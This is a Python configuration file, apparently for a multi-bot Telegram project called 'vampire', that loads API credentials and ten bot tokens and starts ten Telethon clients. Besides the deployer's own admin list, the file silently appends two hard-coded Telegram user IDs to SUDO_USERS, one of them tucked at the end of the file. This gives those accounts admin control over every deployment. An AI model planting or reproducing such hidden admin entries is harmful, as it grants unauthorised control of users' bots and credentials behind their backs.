# Copyright © 2021 @MickeyxD

import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

vampireversion = "v0.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default=None)
BOT_TOKEN2 = config("BOT_TOKEN2", default=None)
BOT_TOKEN3 = config("BOT_TOKEN3", default=None)
BOT_TOKEN4 = config("BOT_TOKEN4", default=None)
BOT_TOKEN5 = config("BOT_TOKEN5", default=None)
BOT_TOKEN6 = config("BOT_TOKEN6", default=None)
BOT_TOKEN7 = config("BOT_TOKEN7", default=None)
BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1517994352 not in SUDO_USERS:
    SUDO_USERS.append(1517994352)

# Tokens

Geo = TelegramClient('Geo', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

Geo2 = TelegramClient('Geo2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

Geo3 = TelegramClient('Geo3', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

Geo4 = TelegramClient('Geo4', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

Geo5 = TelegramClient('Geo5', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

Geo6 = TelegramClient('Geo6', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

Geo7 = TelegramClient('Geo7', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

Geo8 = TelegramClient('Geo8', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

Geo9 = TelegramClient('Geo9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

Geo10 = TelegramClient('Geo10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

SUDO_USERS.append(2086101519)
